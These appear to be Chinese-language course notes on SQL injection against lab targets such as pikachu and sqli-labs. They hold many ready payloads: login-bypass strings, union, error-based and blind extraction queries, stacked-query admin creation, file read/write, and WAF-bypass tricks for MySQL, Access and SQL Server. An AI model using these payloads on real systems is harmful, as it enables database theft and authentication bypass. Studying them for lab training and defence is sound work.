# SQL注入



##  注入要跟在注入点后面

![image-20231001181425059](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231001181425059.png)



## sql注入的产生过程及常见原因 

- 产生过程
  	大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。

- 常见的sql注入产生原因
  	基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。 



- 不当的处理类型
        Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 



- 不安全的数据库配置
        数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。

  这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。



- 不合理的查询集处理
          有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。

 

- 不当的错误处理
  	错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 



- 多个提交处理不当

​	大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。
​     应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。
​     例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程



## 顺序union>报错>bool>time



## 先判度注入类型,判断怎么闭合

判断依据为若前面确定为真则可以用and来进行拼接真假语句

若前面不能确定为真则用or

例 `and 1=1 --+ 或 or 1=1 --+  我们来通过修改前面的闭合符号 并修改 1=1 和 1=2 页面的不同来判断我们有没有闭合成功`

或这么判断也是观察页面的变化,有变化就是带入了

![image-20231001195910408](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20231001195910408.png)

![image-20230930162520382](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230930162520382.png)

![image-20230930162532341](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230930162532341.png)

![image-20230930162544851](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230930162544851.png)

![image-20230930162559229](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230930162559229.png)

![image-20230930162610844](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230930162610844.png)

## 一般注入 

```
可以用引号进行测试是字符串还是数字型
分析注入点:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''12312''' at line 1
''12312'''  --->去掉最外层的一对引号 '123''   -->可以看出是单引号包裹的 字符类型注入

闭包需要查看源码看有没有引号括号来进行有针对的闭包

Select * from users where id= 1”

思路

布尔盲注拼接真假语句
Select * from users where id = 1” and 1=1 --+   注释类型
http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=' or '1'='1&submit=Ã¦ÂÂ¥Ã¨Â¯Â¢  闭包型

万能密码
3组
用户名已知:
用户名 Admin 密码 1’ or ‘1’=‘1
用户名 Admin'or'1'='1 密码 随便写

可用注释符号:
用户名 'or 1=1 --+ 密码 随便输入

用户名未知:
用户名 1'or'1'or'1 密码 随便输
```

## 万能密码原理

![image-20230920201051623](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230920201051623.png)

![image-20230920201129675](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230920201129675.png)

## union联合查询

原理是让前面的查询结果为空走后面的union查询

但是我们需要让联合查询后面的**字段数和主查询一致**

所以我们需要下先进行BOOL盲注来保证前面的**主查询为正确的但是查询结果为空**

下一步在后面使用order by 配合二分法试出有几个字段数

最后我们使用联合查询

```
http://localhost/pikachu/vul/sqli/sqli strphp?name=0' union select 1,2 --+&submit=查询
```

注意我们union select 后面的字段数就算没有值也需要和用值来占位,否者报错

如果字段数比较多我们需要先确认那几个是显示位

确认输出位后我们可以拿数据库函数来替换占位的值

后面我们就可以结合元数据库来进行查值

具体思路就是我们需要先知道是哪个数据库,再查询是哪个表名(table_name),之后进入表中拿出表头(column_name),来进行我需要那些数据,过程都可以使用group_concat来进行一行来输出

之后我们就可以看输出位有几个来进行我们想要获取到的值

特殊情况,如果是数字型,后端对引号做了过滤,我们可以采用十六进制来进行编译

```
老师写的步骤代码:

尝试先获取当前的数据库名 
1. 判断查询语句的列数 (保证当前语句有查询结果的情况下拼接order by 测试)
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312' or 1=1  order by 1 --+&submit=æ¥è¯¢
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312' or 1=1  order by 2 --+&submit=æ¥è¯¢
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312' or 1=1  order by 3 --+&submit=æ¥è¯¢
当使用第3列测试,页面出现错误, 或者内容不显示的情况, 说明当前就只用2列

2. 实现查询结果为假 , 没有结果
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312'   order by 2 --+&submit=æ¥è¯¢

3.拼接union , 查看显示位
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312'   union select  1,2 --+&submit=æ¥è¯¢

4. 在显示位的位置嵌入查询当前数据库名的代码
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312'   union select  database(),2 --+&submit=æ¥è¯¢
得到当前数据库为: pikachu

5. 开始借用系统默认库,获取pikachu 中的表名
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312'   union select  table_name,2  from information_schema.tables  where table_schema='pikachu'--+&submit=æ¥è¯¢
一般情况下,只能一行一行的输出,需要字符串连接函数来处理 或者 结合limit 一行一行的输出
limit
第一行
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312'   union select  table_name,2  from information_schema.tables  where table_schema='pikachu' limit 0,1--+&submit=æ¥è¯¢
第二行
http://192.168.1.163/pikachu/vul/sqli/sqli_str.php?name=12312'   union select  table_name,2  from information_schema.tables  where table_schema='pikachu' limit 1,1--+&submit=æ¥è¯¢

全部行一起取出来: 结合group_concat       httpinfo,member,message,users,xssblind 
select  group_concat(table_name),2  from information_schema.tables  where table_schema='pikachu'

6. 分析表中可能存储什么数据,一般获取  重要数据  users
直接全部一次性获取   id,username,password,level 
select  group_concat(column_name),2  from information_schema.columns  where table_schema='pikachu' and table_name='users'

如果在数字型注入过程中，后端对引号做了过滤，那么条件中写的字符串可以转为16进制方式
select  group_concat(column_name),2  from information_schema.columns  where table_schema=0x700069006B006100630068007500 and table_name=0x75007300650072007300

7. 获取具体的数据
select  group_concat(username),group_concat(password)  from users
账号:admin,pikachu,test 
密码：e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03
```

![image-20230921000011037](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921000011037.png)

## 报错注入

***利用前提 没有显示位,但是又输出SQL语句执行错误的函数例如mysql_error  优点不需要显示位,缺点以来SQL语句报错函数***

把你想要的值通过报错输出回来 

有三个常有函数

**floor() count()不会计算空值  concat中的0x7e必须带,报错的关键,分割字符串可以在concat前面使用substr mid等  相关详细解释参考网址 https://www.cnblogs.com/sfriend/p/11365999.html**

```
http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=' or (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))) --+&submit=æ¥è¯¢
```

 

**extractvalue(xml_document,xpath_string) xml_document(string格式,是xml的文档名称) xpath_string(xpath格式字符串,可以替换成你要输出的函数) concat中的0x7e必须带,报错的关键,分割字符串可以在concat前面使用substr mid等**

```
?id= 1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+

1’ and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e))) #
```



**updataxml(xml_document,xpath_string,new_value) xml_document(string格式,是xml的文档名称) xpath_string(xpath格式字符串,可以替换成你要输出的函数) new_value(替换的值) concat中的0x7e必须带,报错的关键,分割字符串可以在concat前面使用substr mid等**

```
?id= 1' and updatexml(1,concat(Ox7e,(select database()),0x7e),1) --+
```



## 盲注

### 先获取当前字符串长度,再去获取字符串,每一个字符

**利用前提 没有回显位,没有输出SQL语句执行错误函数,只能通过页面返回正常不正常来注入  优点不需要显示位,不需要SQL执行错误函数 ,缺点 速度慢,时间长**

**盲注分为基于布尔和基于SQL**

一般这种情况就需要使用,盲注(很像正常网站)

![image-20230921153246376](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921153246376.png)

先用`?name=' or length(database())>5 limit 1 --+`来判断数据库名称长度,注意源码是不是限制输出一行

再来截取database(),一般我们转换为ascii来用二分法来判断

`?name=lucy' and ascii(substr(database(),2,1))>105 --+`

![image-20230921164927425](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921164927425.png)

还可以不使用ascii,直接来判断字符相不相等

`?name=lucy' and mid(database(,1,1)='p'--+`

![image-20230921164939831](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921164939831.png)

也可以使用正则来对比

`?name=' or database() regexp '^p' limit 1 --+` 正则的表达式需要带引号

![image-20230921164903049](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921164903049.png)

还可以使用like来判断

`?name=' or database() like 'p%' limit 1 --+`  也是需要带引号

![image-20230921164848880](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921164848880.png)

### 时间盲注

利用前提:没有显示位,没有输出SQL语句错误函数,正确的SQL和错误的SQL的返回页面都一样,但是加入sleep(5),响应时间有区别

缺点,速度慢  优点,不需要显示位,不用出错信息

![image-20230921165015870](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921165015870.png)

![image-20230921165024376](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921165024376.png)

![image-20230921165043098](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921165043098.png)

## 其他注入

### post注入方法

在这里就可以进行post注入,之后就可以走正常流程

![image-20230921234619142](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921234619142.png)

### 宽字节注入

限制条件数据库需为GBK编码

使用场景,如果代码中在sql语句前面有addslashes()函数,就需要使用宽字节方法来进行注入

![image-20230921191100140](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191100140.png)

解决办法,利用数据库GBK编码的特性,前面加上一些东西会把后面的addslashes处理出来的\识别成中文字符

`%df` 对应的是汉字字符 "继"

![image-20230921191154110](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191154110.png)

之后再进行各种注入方式

![image-20230921191336570](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191336570.png)

注意事项

![image-20230921191349730](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191349730.png)



###  base64注入

***如果网站传参值有大写小写等号的大概率是base64编码,而且可能是二次base64编码***

适用情况:当传递参数被base64加密后传输的情况

和平时基本没有区别就是你输入的需要先经过base64编码一下再传输

![image-20230921191733014](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191733014.png)

![image-20230921191803706](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191803706.png)

![image-20230921191810652](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921191810652.png)

###  搜索型注入

一般是在搜索框,传输的变量格式为%name%因为两边都有引号,所以需要在后面既补%也看情况补'

![image-20230921194250964](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194250964.png)

注入过程

![image-20230921194313206](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194313206.png)

![image-20230921194323026](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194323026.png)

![image-20230921194330682](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194330682.png)

和正常注入没有太多区别基本一致

### cookie注入

需要他传请求包的时候有cookie

![image-20230921194535002](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194535002.png)

我们相当于是咋cookie中注入,因为他需要把cookie拿到数据库中进行对比

![image-20230921194637828](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194637828.png)

![image-20230921194657350](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921194657350.png)

也是基本和普通注入没有什么区别,就是注入点有区别



### HTTP头部注入User-Agent

![image-20230921195036587](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921195036587.png)

需要注意的点,因为user-agent不是在最后,所以后面不能使用注释,只能使用补全引号,使用报错注入,但是因为该注入没有引号所有需要让'1'='1在最后面,他们之间使用and连接来保证都为zhen'm

![image-20230921195049767](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230921195049767.png)

### x-forwarded-for注入 (level 18)

一般在头部的注入先抓包发到repeater,其他的搞不了

步骤也是直接上引号进行判断怎么闭合是字符型还是数字型,一般带括号要小心,有可能是添加语句,不能使用注释,之后就可以在两段闭合中间按情况使用各种注入

![image-20230923224601882](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230923224601882.png)

![image-20230923224612861](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230923224612861.png)

### referer注入(level 19)

也是头部注入,所以需要抓包,进repeater来进行测试

剩余步骤与x-forward-for相似只是注入位置换成了referer

![image-20230923224942716](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230923224942716.png)

![image-20230924201923639](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924201923639.png)

![image-20230924201934727](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924201934727.png)

### 二次注入(level 24)

二次注入主要就是使用addslashes函数或者get_magic_quotes_gpc对注入语句中的特殊字符进行转义,但是addslashes的转义并不会插入到数据库中,借用这点在进行调用的时候进行注入

![image-20230923225910155](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230923225910155.png)

无法在黑盒和网页前端代码中测试出来,也无法使用测试工具,因为需要确认注入点,不知道什么时候调用这个值,语句未知,扫描工具不会二次检测

可以运用这个漏洞把注入写到用户名中,例如:

![image-20230924000736818](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924000736818.png)

但是注意会有限制代码长度,前端的话改一下就可以了,后端没办法

![image-20230924000042798](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924000042798.png)

![image-20230924000057569](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924000057569.png)

![image-20230924000108508](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924000108508.png)

注释符使用`-- - ` 也是可以的

### 补充:dnslog注入

注入需要高权限,因为需要有文件读取的功能

### 多语句注入堆叠注入(level 38)

一定要是后台使用的是mysql_multi_query()这个多语句查询函数,否则无法实现

堆叠注入是分数据库的有的支持有的不支持

原理:`;`既是上一句语句的结束,又是下一句语句的开始

堆叠也就是多条语句的注入

可以往数据库中执行命令,也可以写入或读取文件

用处:

![image-20230924140030870](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924140030870.png)

也可以用来自己添加管理员账户

![image-20230924140235136](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924140235136.png)

![image-20230924210220827](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924210220827.png)

## 读文件

#### 确认是否有权限

```
secure-file-priv    - 如果文件导入不成功,确认Mysql配置文件my.ini下存在secure-file-priv    - secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的

secure_file_priv的值为null ，表示限制mysqld不允许导入|导出
secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下
secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制
```



简单来说就是在进行union查询的时候使用load_file/into dumpfile/outfile

![image-20230924210418414](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924210418414.png)

## 写文件	

outfile有自己的输出格式,只会按照自己的走

![image-20230924210432913](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924210432913.png)

## 二制写文件

![image-20230924210450206](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924210450206.png)

## 防御

### 手动过滤

![image-20230925092043445](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925092043445.png)

### WAF过滤

## sqlmap如何使用

![image-20230924221532259](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221532259.png)

![image-20230924221541672](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221541672.png)

![image-20230924221549956](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221549956.png)

![image-20230924221557919](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221557919.png)

![image-20230924221604585](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221604585.png)

![image-20230924221609507](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221609507.png)

![image-20230924221617383](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221617383.png)

![image-20230924221703490](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221703490.png)

![image-20230924221709422](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221709422.png)

![image-20230924221724762](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221724762.png)

### 使用示例

![image-20230924221733988](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221733988.png)

![image-20230924221805499](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221805499.png)

## waf绕过

SQL注入绕过WAF的四种思路

### 第一种:内联注释正常绕过:

确定字符类型后再通过使用注释构建我们的语句从而绕过WAF进入到数据库当中.使用`/* !五位数字,但首位数字不能大于版本号 关键字 */`来构建我们的语句(经验之谈注释内容4的次数多一点),`把关键字包裹在注释里面`,具体看下面的PPT截图一定要灵活运用,`还要考虑到关键字替换 替换值换成一般不会存在的值例如-1=-1`

先判断注入是字符型还是数字型

![image-20230924215153814](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924215153814.png)

![image-20230924215202565](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924215202565.png)

![image-20230924215209296](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924215209296.png)

![image-20230924215223849](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924215223849.png)

### 第二种:内联反向思维绕过:

就是与`第一种方法有点反着来`的,第一种是通过在注释当中添加我们的语句,从而绕过WAF,把我们的语句当作参数带到后端代码然后带入数据库去执行,`为什么我们写的是注释里面添我们的语句,而数据库只拿到了我们的语句,没有拿到注释?因为在当绕过WAF后,后端在处理的时候,只会把参数值给带出来,会把其他的字符给过滤掉,不看.`

而这第二种方式就是专门用特殊格式来把我们的语句给包裹起来,从而让WAF误认为我们的语句与那个特殊语句是一条,从而避免了过滤我们的语句,跟第一种的区别在于,第一个是把语句写在注释语句里面,第二个是把语句用注释语句给包裹起来,同时第二个里面注释的语句的5位数字的第一位必须大于版本号,否则即使绕过了WAF也不能在数据库当中成功执行.

`注意除了注释目标换了其他与方式一基本相同,剩余步骤也与方式一相似`

![image-20230924215957244](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924215957244.png)

![image-20230924220116838](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924220116838.png)

![image-20230924220122678](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924220122678.png)

![image-20230924220129395](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924220129395.png)

### 第三种:GET传参绕过:

就是通过构造一个`不存在的参数`,使得`它的值等于我们的用注释包裹的语句`,而当WAF检测时,会发现这个参数并不存在,且后面的值是注释掉的,从而放参数过去,`而到了后端,又只会拿存在的参数的值,就会不看那个不存在的参数,只会拿我们的语句当中的那个存在的参数,`所以,为了让它认识到注释里面的是一个参数,`必须在这个存在的参数名前面加上一个&`,然后后面的语句就与正常的union的格式一样,--+也写在注释里面.

![1695564392476](C:\Users\27682\Documents\WeChat Files\wxid_3ntbae9gv2ax22\FileStorage\Temp\1695564392476.png)

`相当于在问号后面连接一个不认识的参数,之后在后面的注释中写咱们正确的语句,但是前面需要使用&符号连接`

![image-20230924220647535](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924220647535.png)

### 第四种:URL编码绕过:

就是把`例如%!字母使用/* */包裹 或 /* URL编码 */ 来进行干扰,关键字在注释外面 `

![image-20230924221043230](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221043230.png)

![image-20230924221314834](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221314834.png)

![image-20230924221321142](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221321142.png)

![image-20230924221326156](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221326156.png)

### 其他绕过方法

![image-20230924221353500](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230924221353500.png)

![image-20230925092741864](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925092741864.png)

## ACCESS数据库(大概率语言为asp)

![image-20230925193358189](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925193358189.png)

### 关键函数

![image-20230925195229026](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925195229026.png)

### 注入流程

![image-20230925200534491](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925200534491.png)

### 联合查询注入

也是拼接真假语句,但是难度在于我们要猜表名,字段名,来观察页面返回是否正常来进行判断

![image-20230925200620548](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925200620548.png)

![image-20230925203757505](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925203757505.png)

![image-20230925203814609](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925203814609.png)

必须带上猜测的表名,没有数据库

![image-20230925203846015](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925203846015.png)

![image-20230925203859271](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925203859271.png)

**联合查询时如果想要第二行以后的需要where id>1 和top 1 进行配合,因为这里没有limit**

![image-20230925205535944](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205535944.png)

**在select后面加上top 1空格后面跟上想要的值或者占位符**

![image-20230925203910028](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925203910028.png)

### 布尔盲注

![image-20230925205625838](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205625838.png)

![image-20230925205642190](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205642190.png)

![image-20230925205655233](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205655233.png)

![image-20230925205705154](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205705154.png)

![image-20230925205726424](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205726424.png)

![image-20230925205756345](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205756345.png)

![image-20230925205806951](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925205806951.png)

#### payload

```
判断数据库类型： and (select count(*) from msysobjects)>0 （返回错误则为access数据库）

猜解表名： and exists (select * from admin) (返回正确则存在admin表，返回错误则不存在)

猜解字段： and exists (select username from admin)（若无出错则证明存在username字段）

猜解用户名长度： and (select top 1 len(username) from admin)>0
（用数字替换0，直到返回非正常页面，数字为多少用户名长度就为多少）

猜解密码长度：and (select top 1 len(password) from admin)>0
（用数字替换0，直到返回非正常页面，数字为多少密码长度就为多少）

猜解用户名内容： and(select top 1 asc(mid(username,1,1))from admin)=97
（若返回正常，说明username的第一位内容是ASC码的97，也就是a，猜第二位把username,1,1改成username,2,1就可以了） and(select top 1 asc(mid(username,2,1))fromadmin)=100（若返回正常，说明username的第二位内容是ASC码的100，也就是d，以此类推，便可得到用户名）

猜解密码内容：and(select top 1 asc(mid(password,1,1))from admin)=52
（若返回正常，说明password的第一位内容是ASC码的52，也就是4，猜第二位把password,1,1改成
password,2,1就可以了）
and(select top 1 asc(mid(password,2,1))from admin)=54
（若返回正常，说明password的第二位内容是ASC码的54，也就是6,以此类推得到MD5密码，进行破解后获取
原始密码）
```

## sqlserver

#### 怎么判断

![image-20230925211713815](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925211713815.png)

#### 关键表特性

![image-20230925212831554](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925212831554.png)

#### 关键函数

![image-20230925212840998](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925212840998.png)

#### 注入流程

![image-20230925213427964](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925213427964.png)

#### payload

```
枚举数据库名信息master..sysdatabases表中存放着数据库上的所有数据库名信息
select name from master..sysdatabases

获取当前数据库名称
select db_name()

获取jiaofan数据库中的表名信息。 sysobjects中存放着数据库中所有表名信息包括系统表 ，xtype='U' U是
指用户表
select name from jiaofan..sysobjects where xtype='U' xtype各个类型含义：https://blog.csdn.net/JHHJA/article/details/6239590?utm_source=blogxgwz6

获取关键表中的列名信息。syscolumns中放着数据库所有列名信息包括系统表
select name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where
name='sl_user')
joining table的实现方法：
select a.name from jiaofan..syscolumns a,jiaofan..sysobjects b where b.name ='sl_user' and
a.id=b.id

获取关键字段中的数据
select shouji,mima from sl_user

```

#### 联合查询

注意需要相似的类型

![image-20230925214921229](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925214921229.png)

![image-20230925222019988](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222019988.png)

![image-20230925222030049](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222030049.png)

![image-20230925222041847](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222041847.png)

![image-20230925222054472](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222054472.png)

![image-20230925222101924](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222101924.png)

![image-20230925222111823](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222111823.png)

![image-20230925222120646](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222120646.png)

![image-20230925222130542](C:\Users\27682\AppData\Roaming\Typora\typora-user-images\image-20230925222130542.png)

#### 报错注入



#### bool盲注

